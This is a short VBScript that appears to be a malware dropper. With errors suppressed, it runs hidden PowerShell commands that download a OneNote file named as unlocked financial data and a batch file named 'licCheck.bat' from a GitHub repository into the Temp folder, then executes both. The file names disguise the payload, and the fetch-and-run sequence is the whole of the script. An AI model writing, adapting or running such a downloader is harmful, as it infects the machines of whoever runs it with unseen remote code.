on error resume next
dim file
unblurred = "%Temp%" + "\UnlockedFinData.one"
unlockTool = "%Temp%" + "\licCheck.bat"

CreateObject("WScript.Shell").Run "cmd /c powershell Invoke-WebRequest -Uri
https://github.com/ScottyB95/Onenote/raw/main/UnlockedFinData.one;
Start-Sleep -Seconds 1 " + unblurred,0, true
CreateObject("Wscript.Shell").Run unblurred

CreateObject("WScript.Shell").Run "cmd /c powershell Invoke-WebRequest -Uri
https://github.com/ScottyB95/Onenote/raw/main/licCheck.bat;
Start-Sleep -Seconds 1 " + unlockTool,0, true
CreateObject("Wscript.Shell").Run unlockTool